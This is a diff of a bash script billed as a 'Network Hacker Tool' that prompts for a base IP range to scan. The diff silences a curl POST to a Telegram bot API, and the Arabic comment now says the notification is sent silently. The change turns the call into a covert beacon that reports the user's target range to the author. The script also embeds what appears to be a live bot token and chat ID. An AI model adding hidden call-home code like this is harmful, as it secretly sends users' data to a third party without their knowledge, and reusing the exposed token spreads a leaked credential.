@@ -1,13 +1,13 @@
 #!/bin/bash
 
-# 🌟 SP Network Hacker Tool 🌟
+# 🛡️ SP Network Hacker Tool - Fast Scan Mode 🛡️
 echo "🛡️ SP Network Hacker Tool - Fast Scan Mode 🛡️"
 read -p "Enter the base IP (e.g. 192.168.1.): " base_ip
 
-# إرسال إشعار إلى تيليجرام عند استخدام الأداة
+# إرسال إشعار إلى تيليجرام بصمت
 curl -s -X POST "https://api.telegram.org/bot7459581473:AAHIZAgro3g0L2lslzxV2QLh9-UbLjHBP5I/sendMessage" \
 -d chat_id=7691970173 \
--d text="🚨 Alert: SP Network Hacker Tool was just used on base IP: $base_ip"
+-d text="🚨 Alert: SP Network Hacker Tool was just used on base IP: $base_ip" > /dev/null 2>&1
 
 active_count=0
 
